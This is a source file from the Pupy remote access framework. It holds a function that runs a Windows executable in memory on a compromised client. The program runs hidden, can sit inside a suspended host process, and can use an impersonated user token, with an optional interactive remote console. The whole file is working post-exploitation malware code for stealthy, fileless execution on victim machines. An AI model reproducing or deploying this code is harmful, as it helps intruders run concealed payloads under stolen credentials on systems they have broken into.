#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# Pupy is under the BSD 3-Clause license. see the LICENSE file at the root of the project for the detailed licence terms
from pupylib.utils.pe import get_pe_arch, is_dotnet_bin
from modules.lib.utils.cmdrepl import CmdRepl
import threading


def exec_pe(module, prog_args, path=None, raw_pe=None, interactive=False, use_impersonation=False, suspended_process="cmd.exe", codepage=None, wait=True):
    if not raw_pe and not path:
        raise Exception("raw_pe or path must be supplied")

    if path:
        pe_arch = get_pe_arch(path)
        proc_arch = module.client.desc["proc_arch"]
        if pe_arch != proc_arch:
            module.error(
                '%s is a %s PE and your pupy payload is a %s process. '
                'Please inject a %s PE or migrate into a %s process first' % (
                    path, pe_arch, proc_arch, proc_arch, pe_arch))
            return

        if is_dotnet_bin(path):
            module.error(
                '%s is a .Net binary. Right now this kind of binary is not managed and cannot be loaded '
                'in memory.' % path)
            return

    if not raw_pe:
        raw_pe = b''
        with open(path, 'rb') as f:
            raw_pe = f.read()

    dupHandle = None
    if use_impersonation:
        dupHandle = module.client.impersonated_dupHandle
        if dupHandle is None:
            module.error('No token has been impersonated on this session. use impersonate module first')
            return

    if not hasattr(module, 'mp'):
        setattr(module, 'mp', None)

    mp = module.client.conn.modules[
        'pupwinutils.memexec'
    ].MemoryPE(
        raw_pe, args=prog_args, hidden=True,
        suspended_process=suspended_process,
        dupHandle=dupHandle
    )

    module.mp = mp
    complete = threading.Event()
    stdout = None

    if interactive:
        repl, _ = CmdRepl.thread(
            module.stdout,
            mp.write,
            complete,
            True, None,
            codepage
        )

        module.client.conn.register_remote_cleanup(
            mp.close
        )

        if mp.execute(complete.set, repl._con_write):
            complete.wait()
            mp.close()

            module.client.conn.unregister_remote_cleanup(
                mp.close
            )

            module.success('Process exited. Press ENTER')
        else:
            complete.set()
            module.error('Launch failed. Press ENTER')
    else:
        pid = mp.execute(complete.set)
        if pid:
            module.success('[Process launched: PID={}]'.format(pid))

            if not wait:
                mp.close()
                module.mp = None
                return

            complete.wait()

            stdout = mp.stdout
            mp.close()
            module.mp = None
        else:
            module.error('Launch failed')

    return stdout
